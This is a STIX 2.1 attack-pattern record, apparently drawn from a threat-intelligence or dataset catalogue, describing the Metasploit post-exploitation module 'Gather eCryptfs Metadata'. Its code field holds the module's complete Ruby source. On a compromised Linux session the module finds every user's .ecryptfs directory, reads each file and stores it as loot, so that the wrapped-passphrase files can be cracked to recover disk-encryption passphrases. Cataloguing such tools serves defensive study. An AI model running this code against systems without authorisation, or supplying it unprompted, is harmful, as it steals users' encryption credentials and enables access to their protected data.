{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4b26125d-caeb-4163-bfce-f2054e4a9023",
    "created": "2024-08-14T16:33:17.304027Z",
    "modified": "2024-08-14T16:33:17.304031Z",
    "name": "Gather eCryptfs Metadata",
    "description": " This module will collect the contents of all users' .ecrypts directories on the targeted machine. Collected \"wrapped-passphrase\" files can be cracked with John the Ripper (JtR) to recover \"mount passphrases\".  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/ecryptfs_creds.rb",
            "external_id": "ecryptfs_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Gather eCryptfs Metadata',\n        'Description' => %q{\n          This module will collect the contents of all users' .ecrypts directories on\n          the targeted machine. Collected \"wrapped-passphrase\" files can be\n          cracked with John the Ripper (JtR) to recover \"mount passphrases\".\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Dhiru Kholia <dhiru[at]openwall.com>'],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell']\n      )\n    )\n  end\n\n  # This module is largely based on ssh_creds, gpg_creds and firefox_creds.rb.\n\n  def run\n    print_status('Finding .ecryptfs directories')\n    paths = enum_user_directories.map { |d| d + '/.ecryptfs' }\n    # Array#select! is only in 1.9\n    paths = paths.select { |d| directory?(d) }\n\n    if paths.nil? || paths.empty?\n      print_error('No users found with a .ecryptfs directory')\n      return\n    end\n\n    download_loot(paths)\n  end\n\n  def download_loot(paths)\n    print_status(\"Looting #{paths.count} directories\")\n    paths.each do |path|\n      path.chomp!\n      sep = '/'\n      files = cmd_exec(\"ls -1 #{path}\").split(/\\r\\n|\\r|\\n/)\n\n      files.each do |file|\n        target = \"#{path}#{sep}#{file}\"\n        if directory?(target)\n          next\n        end\n\n        print_status(\"Downloading #{path}#{sep}#{file} -> #{file}\")\n        data = read_file(target)\n        file = file.split(sep).last\n        loot_path = store_loot(\"ecryptfs.#{file}\", 'text/plain', session, data,\n                               nil, \"eCryptfs #{file} File\")\n        print_good(\"File stored in: #{loot_path}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}